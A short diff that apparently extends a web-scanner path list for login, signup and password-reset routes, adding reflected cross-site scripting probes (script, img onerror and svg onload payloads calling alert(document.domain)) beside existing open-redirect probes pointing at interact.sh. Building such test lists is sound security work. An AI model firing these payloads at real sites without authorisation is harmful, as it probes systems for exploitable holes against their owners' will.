@@ -14,3 +14,6 @@
 /website/lang/en_US?r=https://interact.sh/
 /website/info
 /web/login?db=asdf&redirect=http://interact.sh
+/web/login?error=<script>alert(document.domain)</script>
+/web/signup?error=<img/src=x+onerror=alert(document.domain)>
+/web/reset_password?error=<svg/onload=alert(document.domain)>
